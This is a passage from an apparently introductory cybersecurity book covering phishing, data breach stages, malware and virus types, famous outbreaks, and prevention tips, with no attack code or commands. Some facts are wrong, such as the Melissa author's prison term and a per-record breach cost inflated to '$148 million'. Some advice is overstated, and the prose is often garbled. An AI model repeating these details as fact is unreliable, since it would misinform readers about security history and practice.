> If hackers can see a human being, there won’t be any need to hack into your computer. Socially engineered attacks come in various forms; oftentimes, this is normally through malware. Has your antivirus popped up an alert message on your screen? Have you unknowingly clicked on a malicious attachment? If this is true, then you have come close to a malware attack. Cybercriminals like to invade their target’s system using malware because of their effectiveness. Malware is a very dangerous software, which includes ransomware and virus. Once it gains access to your system, it causes havoc, ranging from monitoring your online actions, controlling your machine, and monitoring your keystrokes to steal sensitive information from you. You will learn more about malware, viruses, and ransomware in later chapters.

*   > Phishing Attacks

> The likelihood of you clicking a link in your email or opening an attachment is slim. However, there must be a compelling reason to take such a step considering the danger involved. Cybercriminals are aware of this fact and will do anything within their reach to persuade.

> The best way for anyone to steal your password or information is to track you to reveal such information. It doesn’t matter your level of security expertise, anyone can be a victim of a phishing attack. Because of this, most people use a two-factor authentication process to protect their information. If an attacker stills your password, it is as good as unless if he doesn’t know the second-factor key.

> What happens during a phishing attack is that the attacker poses as a trusted friend or business partner and sends you an email. The email will look authentic and have certain urgency written in it. The email will contain a link or attachment that requires you to open. Once you mistakenly open the email attachment, it installs the malware to your system. Alternatively, if it is a link, it transfers you to a website that looks genuine and requests for login information. Actually, this trap is to lure you to revealing your credentials. In dealing with this kind of situation, you must verify the email and attachments from the sender.

*   > SQL Injection Attack

> With your little computer knowledge, you do know that we use SQL (structured query language) to communicate with databases. These databases are essential for storing relevant information. Most servers that stores sensitive information for websites and services utilize the services of SQL to manage the data. This particular attack focuses on the SQL database and reveals sensitive. The issue increases if such a server stores individual details of the client such as passwords, credit card numbers, etc., which serves as a lucrative and tempting target for attackers.

Cybersecurity Basics – Protecting Your Computer Network Against Virus and Malware

Spyware, ransomware, worms, viruses, and hackers are just a few things that have the potential of harming your network and computer system. The situation gets worst when you discover how easy it is for these hackers to steal your information merely through a malicious link in an email. However, there are various ways to attack or exploit a computer. In the same manner, we also have ways of protecting ourselves from these hackers. In this section, I will explore important ways of protecting your computer network against viruses and malware.

*   > Use Complex Passwords and Occasionally Change Them

> One easy thing to do to improve your security is to use a strong password. You should use a strong password, which includes special characters like “&*!@#” in addition with numbers and letters. A complex password should be within 8-17 characters in length. Furthermore, don’t write or store your passwords on your device as this is an easier means for hackers to steal your information. You should change your password occasionally, as it will help prevent any force password cracks. The best practice in protecting your cybersecurity is to update your passwords once every 3 months.

*   > Install Antivirus

> The first step to protecting your computer network and the system is to install an antivirus to protect you against viruses and malware. An antivirus can actively scan for any virus attempting to penetrate into your system files, email, or operating system. Importantly, the antivirus you decide to use must run periodic updates. These updates are crucial because every day new viruses are created and these updates are the key to averting any likely attack.

*   > Install Anti-Malware and Anti-Spyware Programs

> Spyware and malware can cause severe damage to your computer network in the same manner as a virus. It is imperative to install anti-spyware and anti-malware programs besides the antivirus you have installed. You should occasionally update this software to help remove and quarantine any malware or spyware. What most people do is to install an antivirus only and think they will be protected from any likely danger.

*   > Perform Periodic System Backup

> There are various types of malicious agents such as ransomware, malware, viruses, worms, etc., which can destroy your files. A good way to safeguard yourself against any attack is to create a periodic backup. For instance, if you consistently back up your computer, you may have something to leverage on if you are attacked by a ransomware. Remember, what attackers do when they attack your system with ransomware is to encrypt your data and expects you to pay a ransom to decrypt these files. However, if you have previous backups, you won’t border paying such ransom because at times there is no assurance of the hackers decrypting the file after payment. You can use external drives to backup your data. However, recently we have seen the rise of cloud storage systems.

*   > Install Firewall

> A firewall is an essential security tool you need to protect your network against attack. It serves as a perimeter within your computer and blocks any unapproved outgoing and incoming access. When you want to configure or set it up, ensure to use the inbuilt firewall capabilities of your OS. You can update your firewall setting to suit your preference.

*   > Be Careful with Your email

> Cybercriminals can take advantage of your emails in various ways. They can attach viruses in your email, which is triggered when you open the attached file. Importantly, you should only read or open emails from people you know. If the email sent to you isn’t recognized, endeavor to delete it immediately.

*   > Be Cautious When Using the Internet

> It is significant to know that no website is safe. Irrespective of how safe they may be, there is the possibility of them containing malware and spyware. With a single click of the finger, your computer can become infected with a virus, malware, and spyware. Since the increase of cyber threats, we have seen malicious websites camouflaged as real websites. However, when entering any website, ensure to check the name, spelling, and make the necessary correction if you discover anything. Furthermore, avoid clicking graphics, ads, popups, and links to unverified websites.

> The protection of your computer network and the system begins with you – the user. You should take the time to understand basic online security. You have already taken the right step by downloading and reading this book. It doesn’t stop here; ensure to put everything you learn in this book into action.

*   > Security Approaches

> A security approach from one organization to another may be implemented using different models. However, in this book, I will summarize four important approaches that most organization uses.

> No security – This model is the simplest model to implement where the individual or organization decides not to implement any form of security whatsoever. However, intruders can attach the organization in this model.

> Security through obscurity – this particular security model has a secured system; nevertheless, no one has knowledge of the existence of any security procedure or its content. Unfortunately, this approach isn’t a long-term approach because hackers have ways of knowing about the security structure.

> Host Security – in this security model, each system has its own security put in place. It is one of the safest approaches to apply. However, the downside lies in its complexity and diversity in an organization making it harder.

> Network security – As an organization tends to grow and become diverse, it is hard to keep up with the security challenges. However, using a network security model helps the organization to stay focus on controlling access to its network through various hosts. The network security model is one of the efficient and scalable models to implement.

Important Security Management Practices

Having a good security practice is paramount. A good security management practice will require you to put a security policy in place. It is quite easy to implement a security policy because it goes a long way to ensuring a good security management practice. The following are four important aspects of a good security policy.

*   > Legality – Does the policy meet every legal requirement?

*   > Cultural  issues – does the policy meets with people’s beliefs, working style, and expectations?

*   > Functionality – What are the mechanism of rending security?

*   > Affordability – what is the cost of implementing this security?

> Chapter 3: Breaches in Cybersecurity

Nowadays, organizations are investing heavily in digital infrastructure because of the consequence of cybersecurity attacks and data breaches, which is on the rise. According to a recent investigation by the Ponemon Institute, the average cost incurred by data breaches in 2018 alone has increased by 6.4% when compared to the previous years, which amounted to a total of $3.86 million. Do you know that the average cost of files stolen on the internet has increased to $148 million? These figures are on the rise as the day goes by if we do not act by protecting our data.

Giving the increasing costs and rising stakes of data breaches, both individuals and companies throughout various industries must ensure they understand what they are fighting against. This is absolutely striking considering the fact that hackers and cybercriminals are taking advantage of the same vulnerabilities, which has been the product of previous mistakes from different industries. Actually, another investigation report on “Verizon’s 2018 Data Breach” indicated that since 2014 about 90% of data breaches and 94% of security incidents have fallen into the same categories.

This means that organizations and individuals must learn new tricks to prevent any form of a data breach while investing in relevant tools to close the cybersecurity gaps, which makes such a situation to happen. Although, this may not mean the same thing for different people, however, what is essential is pinpointing the likely risk you may face as an individual within the context of a cybersecurity breach. Furthermore, not only should you identify it, you should implement relevant solutions, which can safeguard your data and protect your online privacy.

To solve this issue, clear questions must be asked to arrive at the best solution. For instance, why are you having data breaches? What type of data breach do you face frequently? What can you do to avert this situation? Once you begin to proffer solutions to these questions, you are moving closer to a solution that will protect your online presence.

What does Data Security Breach entail?

Not everyone can convincingly understand what a data security breach entail. The nature of a security data breach may vary from an individual, network architecture or organization size. Nevertheless, no matter what level, a data breach is simply unauthorized or illegal access to private information. The intention of these cybercriminals and hackers varies; however, one thing we know is their illegitimate nature in accessing data and information that does not belong to them. Furthermore, it is important to highlight that data breach also including the exfiltration of information, which certain people have access to without proper approval from the owners.

How Does a Data Breach Occur?

Data breach follows a particular pattern, even though we have various types of data breaches. Later in this chapter, I will expound on these various types of data breaches. Understanding how these cybercriminals successful pull a data security breach will help users and various cybersecurity experts better evaluate any weaknesses and prepare effectively in order to thwart their schemes.

![](images/00021.jpg)

From the diagram above, it is evident that data breach can take place in four different stages. These include:

*   > Probe Phase – In this phase, malicious parties start by making an effort to learn about the network and the environment in general. They start by probing into your cybersecurity defenses, examine your passwords, analyze how to eventually launch a phishing attack, or find out any outdated software that doesn’t have the recent security patches.

*   > Initial Attach Phase – Once they are successful in the probing stage, they will perform the first strike to your network. This is mostly through an email, which tries to trick you into clicking a particular website. This will further take you to a malicious website or corrupt an application that will disrupt your workflow.

*   > Expanded Attack Phase – With the initial attack, your system becomes vulnerable, thereby giving them the opportunity to evaluate the next action to take. Normally, this may involve taking advantage of anything they can hold possible in order to strike on the entire network and get as much information they can.

*   > Data lifting Phase – Due to the different types of cybersecurity breaches that may take place at different timescales, cybercriminals may attempt to perform an exfiltration on as much data as they can. Peradventure, they may lay low to understand the amount of data they can steal.

The particular data stolen from one individual or organization by a hacker or cybercriminal varies. Nevertheless, according to the study conducted by Verizon, 76% of cybersecurity data breaches are financially motivated. Alternatively, this may include trading of sensitive personal data, government records, proprietary information, or customer information. We have seen recent breaches with Uber, Yahoo, and Facebook, where cybercriminals used these stolen data for their personal gains. Furthermore, the breach of data security cut across various sectors without any exemption to a particular sector.

Types of Data Security Breaches

Already, I have explained that we have various caveats when it has to do with avoiding both personal and organizational data breaches. The precise nature of any data attack will be influenced by the individual or organization’s specific vulnerabilities alone with the intention of the attackers. With that clearly stated, we must understand that there are various types of data security breaches, which include password attacks, ransomware attack, malware attack, phishing attack, and human error. However, I will explain the basic types of data security breaches that we are more prone to. These include:

*   > Human Error

> Sometimes, we are the primary cause of data breach, which I categorize as human error. This is usually not intentionally but accidental as the user isn’t conscious of his or her activity. For instance, if you work in an organization, the IT teams may carelessly expose customer’s information through server misconfiguration. Additionally, the employee may be a victim of social engineering attacks. The purpose of these attacks may be to trick the individual in such an organization to download apparently safe files or click on malicious links. Another study by CompTIA indicated that half of the data breaches that occur are the product of human error. Therefore, organizations and individuals must be very careful when clicking a link or downloading a particular file.

*   > Device Loss

> A security data breach may occur because of device loss due to personal absentmindedness or outright robbery, which poses a major security risk. Most times, people are careless and leave their devices such as thumb drives, tablets, laptops, and smartphones, thereby leaving unfettered access to their data and network. Because they don’t pay attention or are conscious of their device, they give these hackers and cybercriminals the opportunity to steal or intrude on their private data. In whatever situation, these criminal bypasses the security of the device and access the users' information.

*   > Cyber Attack

> This tends to be more prevalent among the types of security data breaches we have discussed so far. Today, cyberattacks cost the world over $600 billion, which is why many organizations are becoming concerned about the potential threat it poses. However, individuals and organizations must be on top of their game to avert these threats. Unfortunately, cybercriminals are also not relating as they are using phishing software to penetrate into people’s networks, deploying malware to infect their computer system, and using ransomware to defraud individuals and companies after gaining access to their sensitive information.

*   > Internal Data Breaches

> At times, an un-accidental data breach can be a real threat. Disgruntled workers or those who are on the verge of losing their jobs may steal vital information from their organization. They may access this information and distribute them without any prior permission. However, an organization should be careful because it may not be an accidental breach from an employee.

How to Prevent Data Security Breach

The duty of preventing data security breach doesn’t lie on experts alone as everyone is fully involved. Defending your data from these criminals is a daunting task. To this end, it is paramount to know what steps to take in order to prevent any liable data breach. Traditionally, the lifecycle of a data security breach comprises of the following five stages.

*   > Discovery

> In this stage, the objective of security professionals is to work through delicate information with the aim of identifying any vulnerable data. Criminals find this sensitive information as an easy target. Your personal information including your password, credit card details are some of the information these criminals look at for, and it is important to take relevant steps to protect it.

*   > Detection

> After the discovery stage follows the detection stage, where the monitoring of likely security threats can be identified. Without being vigilant, you can allow cybercriminals to access your information. For instance, if you have applications that you have not updated with the recent security patches, you expose yourself to these attackers to exploit you. Importantly, you should review your pending updates regularly.

*   > Prioritization

> At this stage, your goal is to prioritize your risks and secure any loophole you may open to your attacker. Additionally, you should leverage the combined intelligence of data operations and security information to pinpoint where these criminals may likely attack. Furthermore, you should close such gaps to protect your device. To do this, you need to employ security professionals to conduct audits to your security network.

*   > Remediation

> The purpose of this stage is to resolve any likely threat you may have identified and prioritize during the process. For instance, a remedy may be to install the recent security patches to your outdated software or encrypting sensitive information

Conclusively, there is a need to strategically and effectively manage this entire process. Significantly, the process of preventing a security data breach is a continuous process because the threat to a computer network and devices are on the rise.

Security Data Breach Prevention Tools

![](images/00022.jpg)  

The prevention of breaches in cybersecurity is an enormous task for both cybersecurity professionals and the IT team. Besides this, it is very challenging considering the impact and increase of cyber threats within the last ten years. In the previous section, I talked about how to prevent a data breach, but that alone isn’t enough to deal with the potential threats. However, there are software applications that can help in protecting your data from criminals. These software applications include:

*   > Access Control Software

> Today, we have software applications that can help to manage access rights while helping you to delegate accurate permissions to workers if you work in an organization. These applications are not for organizations alone, but you can set them to control your basic security for your devices. With this control, only authorized personnel can access the particular information you allow. In certain situations, these software applications can help in auditing trails and generating reports based on the instruction you set.

*   > Security Information and Event Management Software

> The primary purpose of these applications is for log management and effective when used in an organization. It helps in collecting, storing, analyzing, and reporting relevant log data. Furthermore, they also supervise real-time security alerts and resolve any potential threats without informing you.

*   > Antivirus

> Most people neglect the importance of antivirus. You can read more about antivirus in the Chapter on “Computer Viruses.” They can help protect you from various threats while assisting you in pinpointing and removing any potential threats that have infiltrated your system. Antivirus can help protect you from ransomware, spyware, adware, worms, Trojans, and any kind of malicious activity. Having a reliable and robust antivirus will help address any threat and give you full visibility of any attack that may occur.

Irrespective of the particular security data breach tools you choose to implement, you should ensure its features are robust. Furthermore, your devices require constant updates and patches to fight against any intrusion. Whatever software you decide to use, ensure it takes data encryption into priority. Today, there are new cyber threats, which are designed to evade our current detection methods. Because of this, your security solution must constantly evolve to stay ahead of these security breaches. Finally, if you want to protect your data and online privacy, you must access any likely threat, understanding how these attacks can take place. Once you have identified these threats, you can draw up plans to mitigate them by using relevant security tools.

> Chapter 4: Malware – Attack, Types, and Analysis

Introduction

Malware is any software, file, or program that is harmful to your computer network or system. Malware is different from the normal programs in such a way that it can spread or reduplicate itself in your network or system without you noticing while causing severe damage. Malware is very powerful and has the potential of creeping the performance of your system while causing grievous destruction to your network. Think about a situation where your computer system is infected and isn’t available for you to use. The data in the system becomes unavailable and unless at that point. This is the product of a malware attack.

Malware attacks did not originate in this internet age; they have been in existence for centuries. However, over time they have evolved and becomes deadlier to their host. Below are some malware attacks that have taken place in history.

*   > Melissa – In 1999, David L. Smith created and released the “Melissa” virus, which was embedded in a Microsoft Word file. He designed the file in a way that it contained passwords for different websites, which lures its victim to open the file. Once an ignorant victim opens the file, the macro is executed and resends the virus to the address book of the users. It singles out the first 50 people in the address book to perpetuate its attack. However, security experts traced the virus to Smith and he was consequently sentenced to prison to serve 10 years.

*   > My Doom – This particular malware isn’t a virus but a worm, which signifies that it doesn’t need any intervention from any human being to spread to the victim's network. In 2004, “My Doom” was among the fastest spreading email worms in the world. Spammers were responsible for spreading the virus. The name of the malware was derived due to the presence of its name in its code. My Doom was deadly during this year and affected huge companies such as Microsoft and Google. Of course, these companies lost billions in the course of its destruction.

*   > Stuxnet – This malware was regarded as the complicated malware that created a hardware level destruction of a nuclear plant in Iran. It gains access to the system through a USB drive and infected the systems. The malware uses a code that generates a counterfeited digital certificate, which enables it to evade any form of detection. It passes through the system’s network to verify the system’s control line, which controls the nuclear centrifuges. It then exploited the system and finally destroyed it.

*   > WannaCry – Up to today, the WannaCry attack is the biggest ransomware attack that has affected over 100 countries. The ransomware exploited an SMB vulnerability, which Microsoft had already pinpointed and patched in March 2017\. The systems that were running on the outdated patches were all affected by this attack. Its mode of operation is virtually different from the aforementioned attacks. It spreads through the users’ network without their intervention and begins to encrypt the entire system, which makes it unusable for the user unless they have paid a ransom. Such attacks were focused on the healthcare industries before it spread to other industries. Marcus Hutchins discovered a killing mechanism; however, when the malware was updated, the malware had found another way to bypass that update.

How Does Malware Works

Cybercriminals and hackers are authors of malware with the intention of causing damage to a network or system. They use various virtual and physical methods to spread this malware, which infects networks and devices. For instance, malicious programs can be sent to your system through a USB drive. Another means could be via drive-by downloads, which automatically download malicious programs to the victim systems without their knowledge or approval.

Another common attack is phishing attacks, where malicious links or attachments are attached in emails that appear to be legitimate. Once the user opens the link, the malware begins execution without the knowledge of the individual. Sometimes, complicated malware usually used a command and control server, which enables the attacker to connect with the victims’ system and exfiltrate any sensitive data. Additionally, they can remotely control such a compromised server or device irrespective of their location.

Evolving strains of malware involve obfuscation and evasion techniques, which are designed to fool the users, anti-malware products, and security administrators. Most of these techniques depend on simple tracks like using web proxies to source IP addresses or hide malicious traffic. There are complex threats such as polymorphic malware. This malware can continually change its fundamental code to evade any form of detection from the antivirus or signature-based detection tools.

Types of Malware

There are various types of malware depending on their characteristics and traits. The following are some of the types of malware:

*   > Virus

> This is one of the popular types of malware with the ability to execute and spread to other files or programs. It usually requires human involvement to run and spread its operation. We also have various types of viruses, which include file viruses, master boot record viruses, macro viruses, polymorphic viruses, and stealth viruses. You can read more on these in the next chapter on “Computer Viruses and Prevention Techniques”

*   > Trojan

> This particular malware is designed to display itself as a legitimate program or file with the intention of gaining access to a system or network. Legitimate software and files are bundled with malware in such a way that once the software is installed in the system, the malware is also installed and begins execution.

*   > Data Sending Trojans

> The job of these Trojans is to steal sensitive data kept in your computer and transfer them to the attacker

*   > Remote Access Trojans – This Trojan enables hackers and cybercriminals to remotely access your computer without the owner’s knowledge. The attacker does this through covert channels.

*   > Security software disabler Trojans – In this case, the Trojan disables the users’ antivirus and firewall system, so that they can download malicious files and run it successfully without any detention.

*   > Destructive Trojans – You won’t want this kind of Trojan to access your system because it destroys all your services and files.

*   > Worms

> This function like a virus but does not require any human involvement to run and spread.

*   > Ransomware

> The primary function of this malware is to infect the user’s system before encrypting the entire system. Once this is accomplished, the attacker demands a ransom payment to rescue the document. There is no assurance that once the ransom is paid, the attacker will decrypt the system.

*   > Spam

> This is usually packed into attachments and emails. The user is tricked into clicking on such attachment or email, which eventually install a virus on the system

*   > Rootkits

> These are hard to detect and impossible to remove. The only remedy is most likely to format the infected system.

*   > Spyware

> This malware acts as a spy and sits on your computer. it monitors and records the user's activity on the system

*   > Adware

> They are used to track the download history and browsing activity of the users with the intention of displaying a banner or pop-up advertisement. They generate unnecessary advertisements that lure the user into buying something online.

*   > Keyloggers

> Also known as system monitors, they record your keystrokes on the keyboard. Through this, they steal your information through the keylogger.

Detection, Prevention, and Removal of Malware

A user may detect the presence of malware through various means. These include:

*   > Automatic reboot and shutdown issues

*   > Issues in shutting down

*   > Inability to delete some types of files

*   > Random shortcut or folders

*   > Unresponsive and slow system

*   > Unnecessary programs or software running

*   > Changes in your system’s default setting

*   > Malware attacks

With these symptoms, you can detect when your network or computer has been infected with malware. However, how can you prevent these issues from repeating itself? The following steps will be helpful:

*   > Sanitize your network and system from any malware infection (Removal process)

*   > Ensure your system and network is safe from any potential attack in the future (Prevention Process)

For the removal process, you can adhere to the following steps:

*   > Disconnect your computer from the network. Furthermore, disconnect any intranet or internet connection

*   > Don’t connect any external drive because it may help spread the malware, which will further infect your system

*   > Use an updated antivirus to scan your system. Ensure you perform a full scan instead of a quick scan

*   > Update all software and window patches. Once completed, reboot the system to clear any malware

*   > If the aforementioned steps don’t work, then you need to format the system and adhere to the prevention steps below.

Since you can remove any malware trace, the following are recommended steps to take if you want to prevent any future occurrence

*   > Always scan your external drive

*   > Update your windows regularly

*   > Use a premium antivirus. Furthermore, ensure to perform a full system scan

*   > Avoid clicking on any attachments or emails from untrusted sources

*   > Don’t download any software from an illegitimate source

*   > Perform update to your important document frequently

*   > If not required, don’t allow macro when using excel

Malware Analysis

Malware analysis is the process of capturing and analyzing the behavior of malware for its detection and prevention. Most antivirus companies perform malware analysis to update their signatures in order to detect and quarantine any malware.

You can now see why updating your antivirus is very important. This particular aspect is for those who are into cybersecurity. One of the careers to venture in cybersecurity is malware analysis. Therefore, the following instruction is for malware researcher and analyst because the analysis below can backfire when done wrongly.

The following are two malware analysis techniques used by malware researchers and analysts.

*   > Static Analysis

This involves reversing the dead malicious code to understand, and it works while preparing a remedy. Fortunately, this analysis doesn’t can any damage to your system; however, not an easy task to learn and perfect because of the following:

*   > Only a few security professions can understand or code stuff since the malware is coded

*   > You must identify what the problem is and this requires experience

*   > It is difficult to get samples of malware

*   > Dynamic Analysis

This analysis is easier than the previous one; notwithstanding, very dangerous and not effective if the malware has gotten to an advanced stage. The analysis is ineffective because some malware can detect when it is run in an open environment or a lab. It can stop running when they detect any analysis tool.

Furthermore, if the malware is timed to attack, it can affect its effectiveness.  The technique requires you to run the malware in a secluded environment in order to pinpoint its behavior. Its behavior can be classified into:

*   > File-system behavior

*   > Network behavior

*   > System changes

*   > Registry changes

In spite of this, the technique is dangerous because

*   > It can cause permanent damage to your system

*   > It can break out from the secluded environment and affect your host system

Different malware has a different intention of attacking a computer system. These could include creating zombies, choking your bandwidth, infecting files, destruction of data, etc. Therefore, you should understand the various malware types and possible ways of avoiding it. If you are working to become a malware analyst, you should understand how malware works, identify them, and create a relevant signature to identify it. Furthermore, malware attacks have become advanced, but their intention hasn’t changed. Therefore, you should take your security seriously before your sensitive information because a medium through which hackers request for ransom. Additionally, ensure your device is protected and avoid the use of an external drive that is not properly vetted through a premium antivirus.

> Chapter 5: Computer Virus and Prevention Techniques

Introduction

Today, the idea of you having a computer virus is frightening and poses a sense of discomfort. No one wants to be in that situation where a security expert informs them that their computer has been infected with a virus with no remedy to rescue their files and important document.

Computer viruses comprise of three different parts, which includes the infection mechanism, the trigger, and the payload. Don’t border asking how I came about this. Well, the explanation below will make sense to you. The infection mechanism deals with how the virus spreads, which is normally by modifying code that contains a copy of the virus. Actually, an infection vector is the way a virus spreads through its medium. Furthermore, some various use multiple ways of infecting files. The trigger part deals with the choice of whether to distribute the payload or not. Finally, the payload involves damaging the system accidentally or intentionally. Besides the infection mechanism, the trigger and payload parts are optional.

A computer virus can spread into your system through the following means:

*   > Pirated software

*   > Visiting an infected website

*   > Installing/downloading media players, toolbars, free games, and other system utilities

*   > Sharing pictures, files, and music with friends

*   > Installing mainstream software applications

*   > Connecting infected external storage devices

What is a virus?

A virus is a program, which attaches itself to the original program code and runs whenever that authentic program runs with the intention of causing harm without the knowledge of the user. A computer virus normally reproduces itself without your knowledge or permission. Generally, they have an infection stage where they regenerate and the attack stage where they cause havoc.

Another definition of a virus will be a program, which reduplicates or replicates its own code by attaching itself to another executable file in a way that the virus code is executed whenever the executable file is executed.

Types of computer virus

> A computer virus can be grouped into various ways, but in this book, I will classify them based on their orthogonal axes. This means we will look at viruses based on the type of target they try to infect along with the methods used to hide from been detected by anti-virus and users. One of the simple ways of categorizing viruses is based on what they try to infect. In this section, I will explore three of these ways, which include executable file infectors, boot-sector infectors, and macro viruses (data file infectors)

*   > Boot Sector Infectors

> In as much as the sequence of operation of the boot virus differs on different machines, it follows a simple process. You power on the system and the ROM-based instructions begin operation. It then performs self-test, device detection, and initialization test. Immediately the boot device is identified with the boot block read from the device, then control is sent to the loaded code. This entire process is known as the primary booting process. Furthermore, the code loaded during this process loads another larger program, which understands the file system structure of the boot device.

> While viruses are becoming obsolete, it doesn’t mean that they won’t pop out. The boot sector virus affects mostly floppy disks, which are used in booting a computer. However, modern systems don’t use floppy disks, but these viruses can still appear on the Master Boot Record of the system. They normally take place in the partitioned storage device of the computer. Notwithstanding, these threats are now mitigated since the evolution of the internet.

*   > Direct Action Virus

> This virus shocked the world in 1998 and is normally triggered when the infected file is executed. It is an infectious virus, which doesn’t stay hidden in the computer memory or install itself. Instead, the load is sent directly to your computer before the virus becomes active. The only limitation to this virus it is activated only when you implement the infected file.

> What the direct action virus does is to attach itself to a COM or EXE files and wait for someone to activate it by clicking on the file. Once the file is executed, it pops into the computer system, looking for similar files in your computer directory to spread the virus. Nevertheless, do not be frightened because the virus doesn’t delete any file, nor does it affect your computer performance. Besides making some of your files inaccessible, the impact on the user is minimal and can be removed with a reliable antivirus program.

*   > Resident Virus

> This particular virus is a file infector. Unlike the direct action viruses, which don’t install itself, the resident virus installs itself in the computer. Even when the original source file has been infected and eradicated, the resident virus makes the file to continue work. Most security experts regard the resident virus is more deadly than its cousin the direct action virus does.

> Simply, the virus attaches itself to your computer memory, affects the file, and leaves the original file behind while running the virus on its own. The painful part is that they are tricky to spot. Trickier is the fact that removing them isn’t easy. Resident viruses comprise of slow infectors and fast infectors. The slow infectors are not easy to distinguish because the symptoms grow slowly. On the other hand, fast infectors create much damage to the system even though they are easier to identify.

> More regrettably is that they can cling to anti-virus software and infect every file the antivirus tries to scan. Nevertheless, to remove them, you need to install an operating system patch.

*   > Polymorphic Virus

> This particular virus is one of the most hardly detectable or removable viruses for any antivirus program. These antivirus programs are hard to protect you when a polymorphic virus attacks your system because the software program has the capability of blacklisting a particular virus variant. However, a polymorphic virus changes its binary pattern whenever it duplicates. When an antivirus program encounters a polymorphic virus, it sees it as a different software in the system. This makes it evade the antivirus blacklist.

*   > Multipartite Virus

> If you have observed, viruses use two methods to transmit their version. This could be through a method or through a single payload. However, just like Oliver Twist that always asks for more, the multipartite virus wants it all. This particular virus spread in various ways and infects files and operating system. Furthermore, the multipartite virus can simultaneously affect executable and boot sector files, which allow them to spread quickly and rapidly. This “two-edged” sword-like attack makes it hard for anyone to remove the virus. It doesn’t matter if you decide to wipe the program files because the virus remains in the boot sector. From the boot sector, it reproduces itself immediately you switch the computer on.

*   > Trojan horse and Worms

> Have you heard about the Trojan horse? What do you think they are? Well, a Trojan horse is a computer program that lets the attack of the Trojan horse to control the device of the user from a remote location. The Trojan horse camouflages as a program that is useful to the users, and immediately it is installed, it creates backdoors, installs malicious payloads, compromises the user’s information, installs unwanted programs, etc.

The following are some activities that an attacker can perform through a Trojan horse.

*   > It damages the user's computer by causing a blue screen of death, crashing the system, etc.

*   > In the course of performing distributed DoS attacks, it uses the individual’s computer as Botnet

*   > Modifying the files of the user’s system

*   > Stealing sensitive information, including credit card, stored password, etc.

*   > View the user’s screenshot

*   > Log all the keys the user presses on the keyboard and sends the information to the attacker. Through this, the attacker harvest the user password, credit card information, and other sensitive information

*   > Perform electronic money theft through illegal money transfers

*   > Download the user’s browsing data

On the other hand, a worm is a malicious computer program, which reduplicates itself through a computer network. A cybercriminal or hacker may use a worm to perform activities like:

*   > Installing a backdoor to the user’s computer; the backdoor can be used in creating a zombie computer, which is used to perform DoS attack, spam emails, etc. furthermore, this other malware can exploit this backdoor.

*   > Install destructive payload code, which carries the worm within the code

*   > Slows down the computer network of the user by overriding the network bandwidth as they reproduce

![](images/00023.jpg)

The Internet and Virus

Previously, viruses spread slowly from one computer system to another through physical media such as a floppy disk. However, since the advancement in technology, a lot of changes have taken place. Today, we don’t use the floppy disk in our computer system to transfer information from one system to another. One would think that the spread of a virus should come to an end. However, that is farfetched because today, the internet serves as a medium through which viruses spread.

We have what I call “conventional virus,” which for me is the danger we can see on the internet. Conventional viruses are manipulating new ways of spreading their impact since their previous means have been mitigated. Conventional viruses can be spread in two ways:

*   > Innocent virus distribution – today, the internet has made it easier to share software irrespective of where the individual is located. However, programs found online can be infected with a virus. Parasitic file viruses operate perfectly in an environment that allows the sharing of files. Macro viruses are common on the internet; additionally, they don’t just attach themselves to code but data, which makes it harder for anyone downloading this software to avoid.

*   > Malicious virus distribution – Another way of spreading virus on the internet is through individuals who spread these viruses through infected programs. Hackers, cybercriminals, or virus creators use the internet as the perfect spot to unleash their mayhem.

How to Prevent Computer Viruses

So far, in this chapter, we have looked at what a virus can do to our computer system. There are various antivirus available online, which you can use to solve your virus problem. However, I want to show you important ways of preventing computer viruses and protecting your online privacy.

Importantly, a computer virus and malware are not the same. While a computer virus is a program that replicates itself and affects files and programs, malware is designed to deny or disrupt the operation of a computer system. Furthermore, malware gain access to your system resource to gather relevant information. Most antivirus programs don’t have the functionality to detect and deal with malware. In order to avoid any form of attack, it is important to adhere to these preventive methods to deal with a computer virus.

*   > Update Your Computer Frequently

> It is important to perform automatic updates to your computer programs because these updates come with security patches that deal with any likely security holes in your computer. I understand that updating a program can be painful as they pop up especially when you are working on an important program. It doesn’t matter how inconvenient they may be, it is significant to update them. Before a virus inconvenience you, it is preferable to put it in the right place.

*   > Avoid using Internet Explorer

> Today, we have numerous browsers for users to choose from. You can choose from Firefox, Chrome, Opera, or Brava rather than using internet explorer.

*   > Perform constant backup

> You do not need anyone to tell you how important it is to backup your computer. If you implement a quality backup strategy, it will be hard for the virus to cause much hard for you. At times, the virus can affect your operating system and if you do not back up, you end up losing every data. Once a virus affects your operating system, the best suggestion will be to reinstall the operating system. Therefore, make it a habit to backup your computer.

*   > Install premium antivirus

> If you want to protect your data and improve your online privacy, you should avoid using a free antivirus program. Endeavor to buy a premium antivirus program and update their virus program and definitions regularly. Some of the effective antiviruses you can choose for your personal computer include Avira, Kaspersky, Bitdefender, Avast Pro, Symantec Norton, McAfee, and Webroot security anywhere antivirus

*   > Scan Email or picture attachments –

> If you are used to downloading attachments, try as much as possible to limit such downloads. Hackers can hack your account through your email; once they can do that, they can use the contact on your address for various malicious activities

*   > Avoid any suspicious website

> Today, we have more than a trillion websites available; it is paramount to be careful when visiting some of these sites because you can’t tell if a picture contains malicious content or not. Furthermore, verify the website before visiting it. for instance, Microsoft.com is different from Microsoft.tisur.com

Staying out of trouble when you are using your computer network should be your priority. You have gone a step in the right direction by downloading this book to educate yourself. However, you must know that new viruses are released every day. While it may be hard to get perfect virus protection, following the few steps here can go a long to protect your data and online privacy.

Conclusion

The aftereffect of a computer virus leaves regrets and damage to your computer system. Besides this, it costs thousands of dollars to get everything back to normal if it does not reap off your entire system. There are various viruses in existence with diverse ways of affecting your computer system.

However, everyone has a role to play in ensuring that his or her device is free from t virus. To protect your computer, you should install an antivirus program, which stores malware and virus programs. Furthermore, endeavor to scan your computer frequently while avoiding the use of external hard disk as the situation may be. A computer virus is expensive to resolve. This doesn’t include the repair time you have to invest but the damages to your data. Therefore, keep abreast of the latest security tips and look at any signs of a virus to stay ahead of any imminent attack.

> Chapter 6: Web Security and Workplace Security Guidelines

Web Security

Websites are regrettably susceptible to security risks. If you are a website owner, it is at risk. This statement is not to scare the shit out of you but to enlighten you on the current reality we are facing. Recent statistics show that in a single day over 50,000 websites are compromised. At this stage, you cannot say, “this won’t happen to me” because it will surely get to you in a matter of time. What most small website owners think is that these hackers have bigger targets to deal with and do not have any reason to hack their site. Unfortunately, 43% of small businesses are victims of cybercrimes.

Globally, about 54% of businesses have experienced a certain kind of cyber-attack, with only 38% readily prepared to handle these attacks. Although, I lack the magic crystal ball to see the future; however, the threat to cybercrime will continually increase in years to come. Notwithstanding, you must take the necessary steps to expand your website security.

Web Security Threats

